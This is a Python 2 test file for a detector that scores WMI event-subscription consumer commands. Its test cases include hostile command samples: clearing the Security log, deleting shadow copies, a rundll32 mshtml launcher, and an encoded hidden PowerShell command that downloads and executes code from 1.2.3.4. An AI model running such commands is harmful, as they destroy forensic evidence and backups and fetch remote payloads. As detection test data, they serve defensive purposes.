# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# Il testo dei consumer delle sottoscrizioni WMI (tc_c_file._giudica_consumer).
import tc_c_file as F, tc_regole as R
casi = [
 (u'Updater\ncmd.exe /c wevtutil cl Security\nC:\\Windows', 3),
 (u'Updater\nvssadmin.exe delete shadows /all /quiet', 2),
 (u'Updater\nC:\\Users\\Public\\svc.exe', 2),
 (u'DellCommandPowerManagerAlertEventConsumer\nC:\\Program Files\\Dell\\CommandPowerManager\\DCPM-Notification.exe', 0),
 (u'BVTConsumer\ncscript KernCap.vbs\nC:\\\\tools\\\\kernrate', 0),
 (u'X\nrundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();', 3),
 (u'X\nC:\\Windows\\System32\\notepad.exe', 0),
 (u'X\nschtasks /run /tn Backup', 0),
 (u'', 0),
 (None, 0),
 (u'X\npowershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAuADIALgAzAC4ANAAvAGEAJwApAA==', 3),
]
sbagliati = 0
for testo, atteso in casi:
    peso, motivo, chiaro = F._giudica_consumer(testo)
    ok = peso == atteso
    if not ok:
        sbagliati += 1
    print ('ok ' if ok else 'NO ') + repr((testo or u'')[:60]), peso, motivo.encode('utf-8')[:110], '| chiaro:', chiaro.encode('utf-8')[:60]
print 'sbagliati', sbagliati
